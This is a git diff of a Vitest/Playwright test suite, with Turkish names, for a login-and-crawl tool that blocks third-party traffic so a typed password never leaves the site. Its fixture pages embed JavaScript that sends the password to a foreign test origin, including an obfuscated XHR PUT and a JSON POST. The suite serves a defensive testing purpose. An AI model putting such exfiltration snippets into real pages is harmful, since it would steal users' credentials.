@@ -1,7 +1,7 @@
 import { createServer, type Server } from 'node:http';
 import { join } from 'node:path';
 import { chromium } from '@playwright/test';
-import { afterAll, beforeAll, describe, expect, it, type TestContext } from 'vitest';
+import { afterAll, beforeAll, describe, expect, it, type TestContext, vi } from 'vitest';
 import { kesfet } from '../../src/kesif/index.js';
 import {
   ayniSiteMi, ayniSiteOriginMi, izinliKumedeMi, kayitliAlanAdi, parolaIzleri, yabanciCerceveler,
@@ -49,6 +49,15 @@ function girisSayfasi(betik: string, action = '/giris', y = yabanciUrl): string 
     + `const k=e.target.k.value,p=e.target.p.value;${betik}});</script></body></html>`;
 }
 
+/**
+ * Yabancı origin'den, sayfa ayrıştırılırken (DOMContentLoaded'dan önce, yani parola yazılmadan)
+ * eşzamanlı betik yükler. Bu, kimlikli evrede o origin'e ayrıcalık VERMEZ: parola yazıldıktan
+ * sonra aynı origin'e GET de kesilir.
+ */
+function oncedenYukle(yol: string): string {
+  return `<script src="${yabanciUrl}${yol}"></script>`;
+}
+
 const sayfalar: Record<string, () => string> = {
   // fetch ile JSON gövdede parola, ardından kendi origin'ine geçiş.
   '/fetch-post': () => girisSayfasi(
@@ -60,8 +69,10 @@ const sayfalar: Record<string, () => string> = {
   '/xhr-gizli': () => girisSayfasi(
     "e.preventDefault();const x=new XMLHttpRequest();x.open('PUT',Y+'/topla');x.send(btoa(p.split('').reverse().join('')));",
   ),
-  // Meşru uygulama: giriş sırasında analytics GET ve parolasız beacon; form kendi origin'ine gider.
-  '/analytics': () => girisSayfasi("fetch(Y+'/analytics.js',{mode:'no-cors'});navigator.sendBeacon(Y+'/beacon','event=login');"),
+  // Meşru uygulama: giriş sayfası analitik betiğini parola yazılmadan önce yükler;
+  // giriş sırasında analytics GET ve parolasız beacon; form kendi origin'ine gider.
+  '/analytics': () => `${oncedenYukle('/analytics.js?yukle')}${
+    girisSayfasi("fetch(Y+'/analytics.js',{mode:'no-cors'});navigator.sendBeacon(Y+'/beacon','event=login');")}`,
   // Form hedefi aynı origin, sunucu 307 ile gövdeyi yabancı origin'e yönlendirir.
   '/yonlendirme-307': () => girisSayfasi('', '/giris-307'),
   // SPA: parolayı sessionStorage'da saklar, URL'yi hemen değiştirir; parolayı giriş penceresi
@@ -85,7 +96,8 @@ const sayfalar: Record<string, () => string> = {
     yabanciPortUrl,
   ),
   // Giriş sırasında yabancı CDN'den parolasız GET (parola "gzip"/"Mozilla" olunca başlıkta geçer).
-  '/cdn-get': () => girisSayfasi("fetch(Y+'/cdn.js',{mode:'no-cors'});"),
+  // CDN origin'i giriş sayfasında parola yazılmadan önce de kullanılır (tarayıcı başlıklarıyla GET).
+  '/cdn-get': () => `${oncedenYukle('/font.css')}${girisSayfasi("fetch(Y+'/cdn.js',{mode:'no-cors'});")}`,
   // Aynı site (app.kobay.localhost → api.kobay.localhost): parolayı API'ye POST eder, sonra panele geçer.
   '/ayni-site': () => girisSayfasi(
     "e.preventDefault();fetch(Y+'/api/login',{method:'POST',mode:'no-cors',body:JSON.stringify({k,p})}).finally(()=>{location.href='/panel';});",
@@ -286,35 +298,55 @@ describe('giriş sırasında JavaScript ile başka origin\'e gönderim', () => {
     expect(yabanciIstekler.filter((satir) => satir.startsWith('UPGRADE'))).toEqual([]);
   });
 
-  it('parolasız analytics GET\'ini geçirir, beacon\'ı keser ama meşru girişi bozmaz', async (context) => {
+  it('parola yazılmadan önceki analytics GET\'i geçer; giriş sırasındaki GET ve beacon kesilir ama meşru girişi bozmaz', async (context) => {
     if (!tarayiciMumkun(context)) return;
     yabanciIstekler.length = 0;
     const harita = await girisDene('/analytics');
     expect(harita.loggedIn).toBe(true);
-    expect(yabanciIstekler.some((satir) => satir.startsWith('GET /analytics.js'))).toBe(true);
+    expect(yabanciIstekler.some((satir) => satir.startsWith('GET /analytics.js?yukle '))).toBe(true);
+    // Gönderim sırasındaki GET (sorgusuz): giriş sayfası origin'i önceden kullanmış olsa da kesildi.
+    expect(yabanciIstekler.some((satir) => satir.startsWith('GET /analytics.js '))).toBe(false);
     expect(yabanciIstekler.filter((satir) => satir.startsWith('POST'))).toEqual([]);
     expect(parolaGitti()).toBe(false);
   });
 });
 
-describe('giriş sonrası: uygulamanın kendi siteler-arası trafiği serbest, parola değil', () => {
-  it('giriş sonrası parolasız siteler-arası POST teslim edilir ve keşif başarılı olur', async (context) => {
+describe('giriş sonrası: kimlikli bağlamda yabancı yazma ve WebSocket kesilir, parola hiç gitmez', () => {
+  it('giriş sonrası parolasız siteler-arası POST, giriş sayfasının önceden kullandığı origin\'e bile teslim edilmez; keşif başarılı, uyarı yazılır', async (context) => {
     if (!tarayiciMumkun(context)) return;
     yabanciIstekler.length = 0;
-    // Giriş penceresinde /panel yüklenir (çerez var ama sayfa POST atmaz); keşif sonra /panel-yazma'ya gider.
-    const harita = await girisDene('/analytics', { maxSayfa: 2, basla: '/panel-yazma' });
-    expect(harita.loggedIn).toBe(true);
-    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/panel-yazma');
-    expect(yabanciIstekler.filter((satir) => satir.startsWith('POST /api/olay'))).toHaveLength(1);
+    const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    try {
+      // Giriş penceresinde /panel yüklenir (çerez var ama sayfa POST atmaz); keşif sonra /panel-yazma'ya gider.
+      const harita = await girisDene('/analytics', { maxSayfa: 2, basla: '/panel-yazma' });
+      expect(harita.loggedIn).toBe(true);
+      expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/panel-yazma');
+      expect(yabanciIstekler.filter((satir) => satir.startsWith('POST /api/olay'))).toEqual([]);
+      const uyari = stderr.mock.calls.map(([metin]) => String(metin))
+        .filter((metin) => metin.includes('after login to protect the password'));
+      expect(uyari).toHaveLength(1);
+      expect(uyari[0]).toMatch(/^\[kobay\] Warning: blocked \d+ third-party requests? after login/);
+      expect(uyari[0]).toContain(yabanciUrl);
+    } finally {
+      stderr.mockRestore();
+    }
   });
 
-  it('giriş sonrası siteler-arası WebSocket sunucuya bağlanır', async (context) => {
+  it('giriş sonrası siteler-arası WebSocket sunucuya bağlanmaz', async (context) => {
     if (!tarayiciMumkun(context)) return;
     yabanciIstekler.length = 0;
-    const harita = await girisDene('/analytics', { maxSayfa: 2, basla: '/panel-ws' });
-    expect(harita.loggedIn).toBe(true);
-    await expect.poll(() => yabanciIstekler.filter((satir) => satir === 'UPGRADE /canli'), { timeout: 3_000 })
-      .toHaveLength(1);
+    const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    try {
+      const harita = await girisDene('/analytics', { maxSayfa: 2, basla: '/panel-ws' });
+      expect(harita.loggedIn).toBe(true);
+      expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/panel-ws');
+      // Sayfa bağlantıyı denedi (kesim sayıldı) ama el sıkışma yabancıya ulaşmadı.
+      expect(stderr.mock.calls.some(([metin]) => String(metin).includes('after login to protect the password'))).toBe(true);
+      await new Promise((coz) => { setTimeout(coz, 500); });
+      expect(yabanciIstekler.filter((satir) => satir.startsWith('UPGRADE'))).toEqual([]);
+    } finally {
+      stderr.mockRestore();
+    }
   });
 
   it('giriş sonrası parolayı POST gövdesinde taşıyan siteler-arası isteği keser ve keşfi reddeder', async (context) => {
@@ -326,13 +358,16 @@ describe('giriş sonrası: uygulamanın kendi siteler-arası trafiği serbest, p
     expect(parolaGitti()).toBe(false);
   });
 
-  it('parola "gzip" ya da "Mozilla" iken sıradan CDN GET\'i sızıntı sayılmaz', async (context) => {
+  it('parola "gzip" ya da "Mozilla" iken sıradan CDN GET\'i sızıntı sayılmaz (giriş reddedilmez)', async (context) => {
     if (!tarayiciMumkun(context)) return;
     for (const parola of ['gzip', 'Mozilla']) {
       yabanciIstekler.length = 0;
       const harita = await girisDene('/cdn-get', { parola });
+      // Sızıntı sanılsaydı giriş reddedilirdi: tarayıcının ürettiği başlıklar aranmıyor.
       expect(harita.loggedIn).toBe(true);
-      expect(yabanciIstekler.some((satir) => satir.startsWith('GET /cdn.js'))).toBe(true);
+      // Parola yazılmadan önceki GET gider (sızıntı denetimi bu evrede de çalışır); sonraki kesilir.
+      expect(yabanciIstekler.some((satir) => satir.startsWith('GET /font.css '))).toBe(true);
+      expect(yabanciIstekler.some((satir) => satir.startsWith('GET /cdn.js '))).toBe(false);
     }
   });
 
